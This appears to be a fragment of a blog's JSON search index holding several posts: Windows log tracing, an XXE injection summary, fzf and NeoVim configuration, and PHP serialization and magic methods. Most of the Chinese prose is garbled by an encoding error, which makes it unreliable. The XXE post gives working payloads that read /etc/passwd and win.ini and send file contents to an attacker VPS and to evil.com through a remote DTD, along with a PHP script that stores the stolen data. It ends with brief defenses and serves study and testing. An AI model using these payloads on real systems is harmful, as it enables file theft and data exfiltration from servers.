ç½‘ç»œå…±äº«å¯¹è±¡å·²è¢«ä¿®æ”¹ 5144 ç½‘ç»œå…±äº«å¯¹è±¡å·²åˆ é™¤ 5145 æ£€æŸ¥ç½‘ç»œå…±äº«å¯¹è±¡ä»¥æŸ¥çœ‹æ˜¯å¦å¯ä»¥å‘å®¢æˆ·ç«¯æˆäºˆæ‰€éœ€çš„è®¿é—®æƒé™ï¼ŒåŠè¯¦ç»†çš„å…±äº«è®¿é—®","link":"/2021/03/12/Windows%E7%B3%BB%E7%BB%9F%E6%97%A5%E5%BF%97%E6%BA%AF%E6%BA%90/"},{"title":"XML External Entity injection(XXE) Summary","text":"XXE æ¼æ´å‚è€ƒï¼š https://xz.aliyun.com/t/3357 Payload æœ‰å›æ˜¾çš„ XXE 12345&lt;?xml version=&quot;1.0&quot; encoding=&quot;utf-8&quot;?&gt;&lt;!DOCTYPE ANY[&lt;!ENTITY resek4 SYSTEM &quot;file:///etc/passwd&quot;&gt;]&gt;&lt;login&gt;&amp;resek4;&lt;/login&gt; æ¡ˆä¾‹CDATA ç‰¹æ®Šå­—ç¬¦ç»•è¿‡åƒæœ€å‰é¢çš„é‚£ä¸ªä¾‹å­ï¼Œå¯ä»¥ç›´æ¥é€šè¿‡ xxe æ¥çˆ†ä¿¡æ¯ï¼Œä½†æ˜¯å¦‚æœä¿¡æ¯æœ‰ä¾‹å¦‚&lt;&gt;è¿™ç§çš„ç‰¹æ®Šå­—ç¬¦ï¼Œå¦‚æœç›´æ¥è¾“å‡ºï¼Œæ˜¾ç„¶ä¼šè¢«è§£æå™¨è§£ææ‰§è¡Œäº† æ‰€ä»¥ï¼Œå½“æˆ‘ä»¬é‡åˆ°è¦ç»•è¿‡ç‰¹æ®Šå­—ç¬¦å°†å†…å®¹å›æ˜¾å‡ºæ¥æ—¶ï¼Œæˆ‘ä»¬å¯ä»¥åˆ©ç”¨ CDATA æ¥ç›´æ¥è¾“å‡ºä¸è¢«è§£æåŸå­—ç¬¦ä¸² è¯­æ³•: 12345&lt;![CDATA[XXXXXXXXXXXXXXXXX]]&gt; ä½†æ˜¯å¦‚æœæˆ‘ä»¬å•çº¯çš„é€šè¿‡ä¸€èˆ¬å®ä½“è°ƒç”¨ï¼Œå»å°† payload æ›´æ”¹ä¸º 1234&lt;!ENTITY start &quot;&lt;![CDATA[&quot;&gt;&lt;!ENTITY goodies &quot;file:///d:/1.txt&quot;&gt;&lt;!ENTITY end &quot;]]&gt;&quot;&gt; ]&gt;&lt;creds&gt;&amp;start;&amp;goodies;&amp;end;&lt;/creds&gt; è¿™æ ·å­å•çº¯æ‹¼æ¥çš„è¯ï¼Œæ˜¯ä¼šæŠ¥é”™çš„ï¼Œå› ä¸ºå¶æˆ‘ä»¬ä¸èƒ½åœ¨[[xml]]ä¸­ç›´æ¥æ‹¼æ¥ ä½†æ˜¯ï¼Œæˆ‘ä»¬å¯ä»¥åœ¨ DTD ä¸­å»æ‹¼æ¥ï¼Œç„¶åé€šè¿‡å‚æ•°å®ä½“è°ƒç”¨å°±å¥½äº† payload 123456789&lt;?xml version=&quot;1.0&quot; encoding=&quot;utf-8&quot;?&gt; &lt;!DOCTYPE roottag [&lt;!ENTITY % start &quot;&lt;![CDATA[&quot;&gt; &lt;!ENTITY % goodies SYSTEM &quot;file:///d:/test.txt&quot;&gt; &lt;!ENTITY % end &quot;]]&gt;&quot;&gt; &lt;!ENTITY % dtd SYSTEM &quot;http://ip/evil.dtd&quot;&gt; %dtd; ]&gt; &lt;roottag&gt;&amp;all;&lt;/roottag&gt; evil.dtd 12&lt;?xml version=&quot;1.0&quot; encoding=&quot;UTF-8&quot;?&gt; &lt;!ENTITY all &quot;%start;%goodies;%end;&quot;&gt; æ— å›æ˜¾ï¼Œä½¿ç”¨å¸¦å¤–æ•°æ®åè®® OOB å¸¦å¤–å¯ä»¥å…ˆç”¨**[[DNSlog]]é“¾æ¥** è¿›è¡Œå…ˆè¡Œæµ‹è¯•ï¼Œæ¥éªŒè¯ç›®æ ‡å¯ä»¥æ­£å¸¸è®¿é—®æˆ‘ä»¬ VPS çš„å†…å®¹ æ”»å‡»é€»è¾‘ä¸ºï¼š1ã€å®¢æˆ·ç«¯å‘é€ payload1 ç»™æœåŠ¡å™¨2ã€æœåŠ¡å™¨å›  remote å®ä½“å‘ VPS è·å–æ¶æ„ DTD æ–‡ä»¶ï¼Œ3ã€XML æ–‡ä»¶çš„å·¦å³å°±æ˜¯è°ƒç”¨ payload1 é‡Œçš„ file:///ï¼Œå¹¶ç»„åˆæˆä¸€ä¸ª send é“¾æ¥4ã€payload1 é‡Œæœ€åï¼Œsend å‘é€ payload1ï¼š 1234567&lt;?xml version=&quot;1.0&quot; encoding=&quot;utf-8&quot;?&gt;&lt;!DOCTYPE roottag[&lt;!ENTITY % remote SYSTEM &quot;http://192.168.1.102/test.dtd&quot;&gt;%remote;%int;%send;]&gt; payload2ï¼šåœ¨æ”»å‡»æœºçš„ web æœåŠ¡å™¨ä¸Šæ‰˜ç®¡ä¸€ä¸ª test.dtd æ–‡ä»¶ï¼Œå†…å®¹ä¸º 12&lt;!ENTITY % file SYSTEM &quot;file:///c:/windows/win.ini&quot;&gt;&lt;!ENTITY % int &quot;&lt;!ENTITY &amp;#x25; send SYSTEM 'http://192.168.1.102/hacker.php?cookie=%file;'&gt;&quot;&gt; æˆ–è€…åœ¨è¿™é‡Œé“¾æ¥ä¸å†™è¿™ä¸ªï¼Œè€Œå†™ http://evil.com:8001/?p=%file; è¿™ä¸ªå‚æ•°éšæ„ï¼Œä¼ å…¥çš„æ–‡ä»¶ä¹Ÿæ²¡æœ‰ï¼Œä½†æ˜¯å¯ä»¥å°†æ•°æ®æµä¼ å…¥ VPS çš„ 8001 ç«¯å£ï¼ˆæˆ–è€…ä¸åŠ å°±æ˜¯é»˜è®¤ 80ï¼‰ï¼Œè€Œåœ¨ VPS ç«¯æˆ‘ä»¬å¯ä»¥ä½¿ç”¨[[NC]]æˆ–è€…[[tcpdump]]æ¥æŠ“å–æ•°æ® hacker.php å¯ä»¥è¿™æ ·å†™ 1234&lt;?php$cookie=$_REQUEST['cookie'];file_put_contents('cookie.txt', $cookie);?&gt; é˜²å¾¡ libxml2.9.0 ä»¥åï¼Œé»˜è®¤ä¸è§£æå¤–éƒ¨å®ä½“ï¼Œå¯¼è‡´ XXE æ¼æ´é€æ¸æ¶ˆäº¡ ä½¿ç”¨å¼€å‘è¯­è¨€æä¾›çš„ç¦ç”¨å¤–éƒ¨å®ä½“çš„æ–¹æ³• 12//PHP libxml_disable_entity_loader(true); è¿‡æ»¤ç”¨æˆ·æäº¤çš„ XML æ•°æ®å…³é”®è¯ï¼š&lt;!DOCTYPEã€&lt;!ENTITYã€SYSTEMã€PUBLIC æ¦‚å¿µå…³äº XML å¯å‚è€ƒ[[XML]] å®ä½“å¼•ç”¨å½“æ ‡ç­¾ä¸º &lt;data&gt;1&lt;2&lt;/data&gt; æ—¶ï¼Œå°äºå·ä¼šå¯¼è‡´ XML æŠ¥é”™ï¼Œæ‰€ä»¥è¦ä½¿ç”¨å®ä½“å¼•ç”¨ï¼š&lt;data&gt;1&amp;lt;2&lt;/data&gt;å®ä½“å¼•ç”¨è¡¨æ ¼å¦‚ä¸‹ï¼š å®ä½“ ç¬¦å· &lt; &lt; &gt; &gt; &amp; &amp; â€˜ â€˜ â€œ â€œ è€Œå¦‚æœåœ¨æ ‡ç­¾ä¸­åµŒå…¥éç³»ç»Ÿé¢„æœŸçš„ç¬¦å·è€Œå¯¼è‡´ä¸­æ–­ï¼Œå°±å¯èƒ½ä¼šå¼•èµ· XXE æ³¨å…¥ XXEXXE æ¼æ´å…¨ç§° XML External Entity Injection å³ XML å¤–éƒ¨å®ä½“æ³¨å…¥ åç«¯ä»£ç  123456789&lt;?php$xmlfile=file_get_contents('php://input');//è·å–å®¢æˆ·ç«¯è¾“å…¥å†…å®¹$dom=new DOMDocument();//åˆå§‹åŒ–XMLè§£æå™¨$dom-&gt;loadXML($xmlfile);//åŠ è½½å®¢æˆ·ç«¯è¾“å…¥çš„XMLå†…å®¹$xml=simplexml_import_dom($dom);//è·å–XMLæ–‡æ¡£èŠ‚ç‚¹ï¼Œå¦‚æœæˆåŠŸåˆ™è¿”å›SimpleXMLElementå¯¹è±¡ï¼Œå¦‚æœå¤±è´¥åˆ™è¿”å›FALSEã€‚$xxe=$xml-&gt;xxe;$str=&quot;$xxe \\n&quot;;echo $str;//è·å–SimpleXMLElementå¯¹è±¡ä¸­çš„èŠ‚ç‚¹XXEï¼Œç„¶åè¾“å‡ºXXEå†…å®¹ã€‚?&gt; payload 1234567&lt;?xml version=&quot;1.0&quot; encoding=&quot;utf-8&quot;?&gt;&lt;!DOCTYPE a [&lt;!ENTITY evil SYSTEM &quot;file:///d://qwzf.txt&quot;&gt;]&gt;&lt;xml&gt;&lt;xxe&gt;&amp;evil;&lt;/xxe&gt;&lt;/xml&gt; ç›¸å½“äºæ˜¯å› ä¸ºä»—ç€åç«¯ php ä»£ç å¯ä»¥æ¥æ”¶ XMLï¼Œè€Œæœªæ›¾ç¦ç”¨ä¼ è¿›æ¥ XML é‡Œ DTD å£°æ˜ä¸­çš„å®ä½“å®šä¹‰ï¼Œå¯¼è‡´æˆ‘ä»¬å¯ä»¥åœ¨å®ä½“å®šä¹‰ä¸­å†™æ¶æ„æ“ä½œï¼ˆè¯»æ–‡ä»¶ç­‰ï¼‰ï¼Œç„¶åä¼ è¿›å»çš„ XML å†™ä¸ªè°ƒç”¨æ¶æ„æ“ä½œçš„å®ä½“å¼•ç”¨&amp;evil å°±å®Œæˆäº†ã€‚ DTD åœ¨ XML ä¸­å®šä¹‰DTD åƒæ˜¯ç±»å®šä¹‰ï¼ŒXML ä¸­çš„æŸä¸€ä¸ªæ ‡ç­¾é›†åˆï¼ˆæˆ–è€…ä¸€ä¸ªå°æ ‡ç­¾ï¼‰éƒ½ä¼šéµå¾ªè¿™ä¸ªç±»ä¸­æ‰€è§„å®šçš„è§„åˆ™ï¼ˆå…ƒç´ æ•°é‡ã€å†…å®¹çš„ç±»å‹ç­‰ï¼‰ä½†æ˜¯è¿™ä¸ªç±»å£°æ˜æ—¶å€™å°±å·²ç»è¡¨åè¦ç»™è°ç”¨äº†ï¼ˆå†™çš„æ˜¯æ ¹å…ƒç´ åç§°ï¼Œå¦‚ä¸‹é¢çš„ addressï¼‰ï¼Œä½†æ˜¯å®é™…è°ƒç”¨æ˜¯å¦‚æœä¸ç‰µæ‰¯å¤šçº§å…ƒç´ ï¼Œæ ¹å…ƒç´ åç§°ä¼¼ä¹å¯ä»¥éšä¾¿å†™ è€Œ !DOCTYPE çš„å‡ºç°æ„å‘³ç€è¦å¼€å§‹è¿›è¡Œ DTD çš„å£°æ˜ DTD çš„æ­£å¸¸æ ¼å¼æ˜¯&lt;!ç±»å‹ å…ƒç´ åç§° å…ƒç´ å±æ€§ å…ƒç´ å†…å®¹&gt;ï¼Œè€Œç›´æ¥åœ¨ XML ä¸­çš„ DTD å£°æ˜å¯ä»¥çœç•¥æ‰å±æ€§éƒ¨åˆ†ï¼Œä¾‹å¦‚ä¸‹ä¾‹ï¼š 123456789101112&lt;?xml version=&quot;1.0&quot; encoding=&quot;UTF-8&quot; standalone=&quot;yes&quot; ?&gt;&lt;!DOCTYPE address [&lt;!ELEMENT address (name,company,phone)&gt; &lt;!ELEMENT name (#PCDATA)&gt; &lt;!ELEMENT company (#PCDATA)&gt; &lt;!ELEMENT phone (#PCDATA)&gt;]&gt;&lt;address&gt; &lt;name&gt;Tanmay Patil&lt;/name&gt; &lt;company&gt;TutorialsPoint&lt;/company&gt; &lt;phone&gt;(011) 123-4567&lt;/phone&gt;&lt;/address&gt; åœ¨ XML ä¸­å¤–éƒ¨å¼•ç”¨ DTDè€Œå¦‚æœè¦å¼•ç”¨å¤–éƒ¨ DTD æ–‡ä»¶ï¼Œåˆ™ DTD æ–‡ä»¶ä¸­å¯ä»¥ç›´æ¥å†™ 123451.dtd&lt;!ELEMENT address (name,company,phone)&gt;&lt;!ELEMENT name (#PCDATA)&gt;&lt;!ELEMENT company (#PCDATA)&gt;&lt;!ELEMENT phone (#PCDATA)&gt; ç„¶ååœ¨ XML ä¸­ï¼Œå¤´éƒ¨å£°æ˜å®Œæˆåç´§è·Ÿ DTD å£°æ˜ 1234567&lt;?xml version=&quot;1.0&quot; encoding=&quot;UTF-8&quot; standalone=&quot;no&quot; ?&gt;&lt;!DOCTYPE address SYSTEM &quot;1.dtd&quot;&gt;&lt;address&gt; &lt;name&gt;Tanmay Patil&lt;/name&gt; &lt;company&gt;TutorialsPoint&lt;/company&gt; &lt;phone&gt;(011) 123-4567&lt;/phone&gt;&lt;/address&gt; å½“å¼•ç”¨çš„ DTD æ–‡ä»¶æ˜¯æœ¬åœ°æ–‡ä»¶çš„æ—¶å€™ï¼Œç”¨ SYSTEM æ ‡è¯†ï¼Œå¹¶å†™ä¸Šâ€DTD çš„æ–‡ä»¶è·¯å¾„â€ï¼Œå¦‚ä¸‹ï¼š 1&lt;!DOCTYPE æ ¹å…ƒç´  SYSTEM &quot;DTDæ–‡ä»¶è·¯å¾„&quot;&gt; å¦‚æœå¼•ç”¨çš„ DTD æ–‡ä»¶æ˜¯ä¸€ä¸ªå…¬å…±çš„æ–‡ä»¶æ—¶ï¼Œé‡‡ç”¨ PUBLIC æ ‡è¯† 1&lt;!DOCTYPE æ ¹å…ƒç´  PUBLIC &quot;DTDåç§°&quot; &quot;DTDæ–‡ä»¶çš„URL&quot;&gt; DTD å®ä½“ ä¸€èˆ¬å…ƒç´ å†…å®¹æ˜¯ ELEMENT 12&lt;!ELEMENT name (#PCDATA)&gt; #PCDATAè¡¨ç¤ºæ­¤å…ƒç´ å¯ä»¥æ¥æ”¶æ–‡æœ¬æ–‡ä»¶ &lt;!ELEMENT name ANY&gt; ANYè¡¨ç¤ºå¯ä»¥æ¥æ”¶ä»»æ„ç±»å‹æ–‡ä»¶ è€Œ ENTITY å®ä½“ æ˜¯åŒ…å«å¤–éƒ¨æ–‡ä»¶æ—¶ç”¨çš„ï¼Œä¸¤è€…å¯ä»¥åœ¨ DTD ä¸­å‡ºç°ï¼Œæ›´ç†æ‰€åº”å½“èƒ½åœ¨ XML ä¸­å‡ºç° ENTITY å®ä½“ä»å¼•ç”¨ä½ç½®åˆ†ä¸ºä¸¤ç±»ï¼š å†…éƒ¨å®ä½“ å³åœ¨ XML ä¸­å¤´éƒ¨é‚£å—ç›´æ¥å®šä¹‰å®ä½“å†…å®¹ä¸åç§°ï¼Œåç»­ç›´æ¥ä½¿ç”¨ 123456&lt;?xml version = &quot;1.0&quot; encoding = &quot;utf-8&quot;?&gt;&lt;!DOCTYPE test [ &lt;!ENTITY writer &quot;Dawn&quot;&gt; &lt;!ENTITY copyright &quot;Copyright W3School.com.cn&quot;&gt;]&gt;&lt;test&gt;&amp;writer;Â©right;&lt;/test&gt; å¤–éƒ¨å®ä½“ ç±»ä¼¼äºå¼•ç”¨å¤–éƒ¨çš„ DTD æ–‡ä»¶ï¼Œä¸”é‚£ä¸ªå¤–éƒ¨ DTD æ–‡ä»¶é‡Œè¾¹è¿˜åŒ…å«äº†å¼•å…¥çš„å¤–éƒ¨èµ„æº å¼•ç”¨å¤–éƒ¨å®ä½“æ—¶å¯ä»¥ä½¿ç”¨ PHP ä¼ªåè®® 123456&lt;?xml version = &quot;1.0&quot; encoding = &quot;utf-8&quot;?&gt;&lt;!DOCTYPE test [ &lt;!ENTITY file SYSTEM &quot;file:///etc/passwd&quot;&gt; &lt;!ENTITY copyright SYSTEM &quot;http://www.w3school.com.cn/dtd/entities.dtd&quot;&gt;]&gt;&lt;author&gt;&amp;file;Â©right;&lt;/author&gt; ENTITY å®ä½“ä»å¼•ç”¨æ–¹å¼åˆ†ä¸ºä¸¤ç±»ï¼š å¼•ç”¨å®ä½“ï¼Œä¸»è¦åœ¨ XML æ–‡æ¡£ä¸­è¢«åº”ç”¨ï¼Œæ ¼å¼ï¼š 12&lt;!ENTITY å®ä½“åç§° &quot;å®ä½“å†…å®¹&quot;&gt;å¼•ç”¨æ–¹å¼ï¼š&amp;å®ä½“åç§°;æœ«å°¾è¦å¸¦ä¸Šåˆ†å·ï¼Œè¿™ä¸ªå¼•ç”¨å°†ç›´æ¥è½¬å˜æˆå®ä½“å†…å®¹,å¦‚ä¸Šä¾‹ å‚æ•°å®ä½“ï¼Œè¢« DTD æ–‡ä»¶è‡ªèº«ä½¿ç”¨ ï¼Œæ ¼å¼ï¼š 1234567891011&lt;!ENTITY % å®ä½“åç§° &quot;å®ä½“å†…å®¹&quot;&gt;å¼•ç”¨æ–¹å¼ä¸ºï¼š%å®ä½“åç§° %file(å‚æ•°å®ä½“)æ˜¯åœ¨DTDä¸­è¢«å¼•ç”¨çš„ï¼Œè€Œ&amp;file;æ˜¯åœ¨xmlæ–‡æ¡£ä¸­è¢«å¼•ç”¨çš„ï¼Œä¾‹å¦‚ï¼š&lt;?xml version=&quot;1.0&quot; encoding=&quot;utf-8&quot;?&gt;&lt;!DOCTYPE test [ &lt;!ENTITY % file SYSTEM &quot;file:///etc/passwd&quot;&gt; %file;]&gt;","link":"/2021/01/11/XXE/"},{"title":"fzf(Fuzzy File Finder) enhances the efficiency and convenience of your command-line workflow.","text":"Installation of fzf123456# Install the fzf itself by Homebrewbrew install fzf# Install the auto-completion and the key bindings# Add the .fzf.zsh which contains the configuration of these downloaded files to the .bashrc and the .zshrc$(brew --prefix)/opt/fzf/install The .fzf.zsh file default contents are these below: key-bindings.zsh only contains CTRL-R, CTRL-T, and ALT-C12345678910111213# Setup fzf# ---------if [[ ! &quot;$PATH&quot; == */opt/homebrew/opt/fzf/bin* ]]; then PATH=&quot;${PATH:+${PATH}:}/opt/homebrew/opt/fzf/bin&quot;fi# Auto-completion# ---------------[[ $- == *i* ]] &amp;&amp; source &quot;/opt/homebrew/opt/fzf/shell/completion.zsh&quot; 2&gt; /dev/null# Key bindings# ------------source &quot;/opt/homebrew/opt/fzf/shell/key-bindings.zsh&quot; Link with NeoVIMInstallation(init.vim) If there is no fzf binary files have been installed before, We should install fzf separately in NeoVim(By Vim-Plug or something else).Otherwise, we could only specify the fzf pathname in our local drive which is enough.1234567&quot; If there is no fzf binary files beforePlug 'junegunn/fzf', { 'do': { -&gt; fzf#install() } }Plug 'junegunn/fzf.vim'&quot; If fzf has been installed at the local drivePlug '/opt/homebrew/opt/fzf'Plug 'junegunn/fzf.vim' Configuration(init.vim)123456789101112131415let $FZF_DEFAULT_OPTS=&quot;--height 40% --border --preview 'bat --style=numbers --color=always --line-range :500 {}'&quot;command! -bang -nargs=? -complete=dir Files call fzf#vim#files('~/', &lt;bang&gt;0)nnoremap &lt;C-f&gt; :Files&lt;CR&gt;command! -bang -nargs=* MRU call fzf#vim#history(fzf#vim#with_preview())noremap &lt;C-h&gt; :MRU&lt;CR&gt;command! -bang -nargs=* Ag \\ call fzf#vim#ag( \\ '', \\ &lt;bang&gt;0 ? fzf#vim#with_preview('up:60%') \\ : fzf#vim#with_preview('right:50%', '?'), \\ &lt;bang&gt;0)noremap &lt;C-c&gt; :Ag&lt;CR&gt; There are defined 3 keybindings(CTRL-f, CTRL-h, CTRL-c), and Ag was used software installed in our local drive called The silver searcher (GitHub - ggreer/the_silver_searcher: A code-searching tool similar to ack, but faster.)","link":"/2022/12/31/fzf/"},{"title":"php è¯¦è§£åºåˆ—åŒ–åŠååºåˆ—åŒ–ç‰¹å¾","text":"æ¦‚è¿° php åœ¨å®šä¹‰ä¸€ä¸ªæ•°ç»„ï¼Œç±»ç­‰å¾ˆå¤šä¸œè¥¿çš„æ—¶å€™ï¼Œä¸ºäº†æ•°æ®ä¼ é€’çš„æ–¹ä¾¿ï¼Œéƒ½å¯ä»¥å¯¹ä¸€ä¸ªå¯¹è±¡æˆ–è€…å®ä¾‹è¿›è¡Œåºåˆ—åŒ– å¯¹ä¸€ä¸ªæ•°ç»„è¿›è¡Œåºåˆ—åŒ– 12345678&lt;?php$sites = array('Google', 'Runoob', 'Facebook');$serialized_data = serialize($sites);echo $serialized_data . PHP_EOL;?&gt;//è¾“å‡ºç»“æœa:3:{i:0;s:6:&quot;Google&quot;;i:1;s:6:&quot;Runoob&quot;;i:2;s:8:&quot;Facebook&quot;;} å¯¹ä¸€ä¸ªç±»è¿›è¡Œåºåˆ—åŒ– 12345678910111213&lt;?php class F{ public $filename='a.txt';}$a = new F();echo $a-&gt;filename.'&lt;br /&gt;';echo serialize($a);?&gt;//è¾“å‡ºç»“æœa.txtO:1:&quot;F&quot;:1:{s:8:&quot;filename&quot;;s:5:&quot;a.txt&quot;;} åºåˆ—åŒ–æ ¼å¼æ‹¿ä¸Šé¢è¿™ä¸ªç±»çš„åºåˆ—åŒ–è¿›è¡Œä¸¾ä¾‹ 1O:1:&quot;F&quot;:1:{s:8:&quot;filename&quot;;s:5:&quot;a.txt&quot;;} O åºåˆ—åŒ–å¯¹è±¡çš„ç±»å‹ï¼Œå…¶ä¸­æœ‰ ç±»å‹ è§£é‡Š a æ•°ç»„ b å¸ƒå°”å€¼ d åŒç²¾åº¦æµ®ç‚¹å‹ i æ•´å‹ o æ™®é€šå¯¹è±¡ r å¼•ç”¨ s å­—ç¬¦ä¸² C è‡ªå®šä¹‰å¯¹è±¡ O ç±» N nullå€¼ R æŒ‡é’ˆå¼•ç”¨ U Unicode å­—ç¬¦ä¸² 1 åºåˆ—åŒ–çš„ç±»åçš„ï¼ˆå­—ç¬¦ä¸²ï¼‰é•¿åº¦ &quot;F&quot; æ˜¯ç±»åæœ¬èº«ï¼ˆå­—ç¬¦ä¸²å½¢å¼ï¼‰ 1 æ˜¯è¿™ä¸ªç±»ä¸­å±æ€§ï¼ˆå˜é‡ï¼‰çš„æ•°é‡ {s:8:â€filenameâ€} ä¸­ s ä»£è¡¨å±æ€§åï¼ˆå­—ç¬¦ä¸²ï¼‰çš„ç±»å‹ {s:8:â€filenameâ€} ä¸­ 8 ä»£è¡¨å±æ€§åï¼ˆå­—ç¬¦ä¸²ï¼‰çš„é•¿åº¦ {s:8:â€filenameâ€} ä¸­ filename ä»£è¡¨å±æ€§åï¼ˆå­—ç¬¦ä¸²ï¼‰æœ¬èº« {s:5:â€a.txtâ€} ä¸­ s ä»£è¡¨å±æ€§å€¼ï¼ˆå­—ç¬¦ä¸²ï¼‰çš„ç±»å‹ {s:5:â€a.txtâ€} ä¸­ 5 ä»£è¡¨å±æ€§å€¼ï¼ˆå­—ç¬¦ä¸²ï¼‰çš„é•¿åº¦ {s:5:â€a.txtâ€} ä¸­ a.txt ä»£è¡¨å±æ€§å€¼ï¼ˆå­—ç¬¦ä¸²ï¼‰æœ¬èº« åºåˆ—åŒ–ç»“æŸåçš„å±æ€§å†…å®¹æœ€åæ˜¯æœ‰ä¸€ä¸ªåˆ†å·çš„ åºåˆ—åŒ–çš„è®¿é—®æ§åˆ¶ä¿®é¥°ç¬¦é€ æˆçš„å½±å“ protected å±æ€§è¢«åºåˆ—åŒ–çš„æ—¶å€™ å±æ€§å ä¼šå˜æˆ %00*%00å±æ€§å private å±æ€§è¢«åºåˆ—åŒ–çš„æ—¶å€™ å±æ€§å ä¼šå˜æˆ %00ç±»å%00å±æ€§å ä¾‹å¦‚ï¼š 1234567891011121314&lt;?php class Ctf{ public $name='Sch0lar'; protected $age='19'; private $flag='get flag'; } $ctfer=new Ctf(); //å®ä¾‹åŒ–ä¸€ä¸ªå¯¹è±¡ echo serialize($ctfer);?&gt;//è¾“å‡ºç»“æœO:3:&quot;Ctf&quot;:3:{s:4:&quot;name&quot;;s:7:&quot;Sch0lar&quot;;s:6:&quot;*age&quot;;s:2:&quot;19&quot;;s:9:&quot;Ctfflag&quot;;s:8:&quot;get flag&quot;;}//å› ä¸º protected çš„å½±å“ï¼Œåºåˆ—åŒ–åçš„ s:6:&quot;*age&quot; æ˜Ÿå·å‰åæœ‰ä¸¤ä¸ªä¸å¯è§çš„ç©ºæ ¼//å› ä¸º private çš„å½±å“ï¼Œåºåˆ—åŒ–åçš„ s:9:&quot;Ctfflag&quot; ä¼šä»¥ç©ºæ ¼ï¼ˆä¸å¯è§ï¼‰ + ç±»å + ç©ºæ ¼ï¼ˆä¸å¯è§ï¼‰ + ç±»å æ„æˆ é­”æœ¯æ–¹æ³• é­”æœ¯æ–¹æ³•æ˜¯ä¸ç®—åœ¨åºåˆ—åŒ–ä¸­å±æ€§å†…å®¹æˆ–å±æ€§æ•°é‡é‡Œè¾¹çš„ åºåˆ—åŒ–ç‰¹åˆ«çš„é­”æœ¯æ–¹æ³•- __sleep() å¦‚æœåœ¨åºåˆ—åŒ–ç±»çš„æ—¶å€™ï¼Œå‘ç°å…¶ä¸­æœ‰ç‰¹æ®Šçš„é­”æœ¯æ–¹æ³•ï¼Œåˆ™ä¼šè§¦å‘ä¸åŒçš„åºåˆ—åŒ–æ•ˆæœ è¯¥æ–¹æ³•å†³å®šäº†ç±»ä¸­é‚£äº›å±æ€§éœ€è¦è¢«åºåˆ—åŒ–ã€‚å¦‚æœæœ‰æ­¤æ–¹æ³•ï¼ŒæœªæŒ‡æ˜çš„å±æ€§å°†ä¸ä¼šè¢«åºåˆ—åŒ–ï¼Œè‹¥æ— æ­¤æ–¹æ³•ï¼Œåˆ™é»˜è®¤å…¨éƒ¨åºåˆ—åŒ– å¦‚æœæœ‰ __sleep() æ–¹æ³•æ—¶ï¼Œåºåˆ—åŒ–æ—¶è¯¥æ–¹æ³•æœ€å…ˆè¢«è°ƒç”¨ ä¾‹å¦‚ï¼š 123456789101112131415161718&lt;?php class Ctf{ public $flag='flag{****}'; public $name='cxk'; public $age='10'; public function __sleep(){ return array('flag','age'); } } $ctfer=new Ctf(); $ctfer-&gt;flag='flag{abedyui}'; $ctfer-&gt;name='Sch0lar'; $ctfer-&gt;age='18' echo serialize($ctfer);?&gt;//è¾“å‡ºç»“æœï¼Œåªåºåˆ—åŒ–__sleep()å£°æ˜ flag å’Œ ageO:3:&quot;Ctf&quot;:2:{s:4:&quot;flag&quot;;s:13:&quot;flag{abedyui}&quot;;s:3:&quot;age&quot;;s:2:&quot;18&quot;;} ååºåˆ—åŒ–ç‰¹åˆ«çš„é­”æœ¯æ–¹æ³•- __wakeup() åºåˆ—åŒ–æ—¶ä¸ä¼šè°ƒç”¨ï¼Œååºåˆ—åŒ–æ—¶æ£€æµ‹åˆ°æ­¤é­”æœ¯æ–¹æ³•ï¼Œä¾¿ä¼šä¾æ®è¯¥æ–¹æ³•å†…çš„æ”¹å˜ï¼Œå¯¹ç±»ä¸­çš„å±æ€§ä¿¡æ¯ï¼ˆåŒ…æ‹¬å±æ€§åï¼Œå±æ€§å€¼ï¼‰è¿›è¡Œå˜æ›´ å¦‚æœæœ‰ __wakeup() æ–¹æ³•æ—¶ï¼Œååºåˆ—åŒ–æ—¶è¯¥æ–¹æ³•æœ€å…ˆè¢«è°ƒç”¨ ä¾‹å¦‚ï¼š 12345678910111213141516171819202122232425262728&lt;?php class Ctf{ public $flag='flag{****}'; public $name='cxk'; public $age='10'; public function __wakeup(){ $this-&gt;flag='no flag'; //åœ¨ååºåˆ—åŒ–æ—¶ï¼Œflagå±æ€§å°†è¢«æ”¹å˜ä¸ºâ€œno flagâ€ } } $ctfer=new Ctf(); //å®ä¾‹åŒ–ä¸€ä¸ªå¯¹è±¡ $ctfer-&gt;flag='flag{adedyui}'; $ctfer-&gt;name='Sch0lar'; $ctfer-&gt;age='18' $str=serialize($ctfer); echo '&lt;pre&gt;'; var_dump(unserialize($str));?&gt;//è¾“å‡ºç»“æœobject(Ctf)#2 (3) { [&quot;flag&quot;]=&gt; string(13) &quot;no flag&quot; [&quot;name&quot;]=&gt; string(7) &quot;Sch0lar&quot; [&quot;age&quot;]=&gt; string(2) &quot;18&quot;}","link":"/2022/02/25/php%20%E5%BA%8F%E5%88%97%E5%8C%96%E5%8F%8A%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/"},{"title":"php é­”æœ¯æ–¹æ³•æ€»ç»“","text":"æ¦‚è¿°PHP: é­”æœ¯æ–¹æ³• - Manual php é­”æœ¯æ–¹æ³•æ˜¯ä¸€ç§ç‰¹æ®Šçš„æ–¹æ³•ï¼Œå½“å¯¹å¯¹è±¡æ‰§è¡ŒæŸäº›æ“ä½œæ—¶ä¼šè¦†ç›– PHP çš„é»˜è®¤æ“ä½œ __construct() æ„é€ å‡½æ•° é€šå¸¸æ„é€ æ–¹æ³•è¢«ç”¨æ¥æ‰§è¡Œä¸€äº›æœ‰ç”¨çš„åˆå§‹åŒ–ä»»åŠ¡ï¼Œå¦‚å¯¹æˆå‘˜å±æ€§åœ¨åˆ›å»ºå¯¹è±¡æ—¶èµ‹äºˆåˆå§‹å€¼ åœ¨æ¯ä¸ªç±»ä¸­éƒ½æœ‰ä¸€ä¸ªæ„é€ æ–¹æ³•ï¼Œå¦‚æœæ²¡æœ‰æ˜¾ç¤ºåœ°å£°æ˜å®ƒï¼Œé‚£ä¹ˆç±»ä¸­éƒ½ä¼šé»˜è®¤å­˜åœ¨ä¸€ä¸ªæ²¡æœ‰å‚æ•°ä¸”å†…å®¹ä¸ºç©ºçš„æ„é€ æ–¹æ³• ä¾‹å¦‚ï¼š 1234567891011121314151617181920212223242526&lt;?class Person{ public $name; public $age; public $sex; public function __construct($name = &quot;&quot;, $sex = &quot;ç”·&quot;, $age = 22) { $this-&gt;name = $name; $this-&gt;sex = $sex; $this-&gt;age = $age; } public function say() { echo 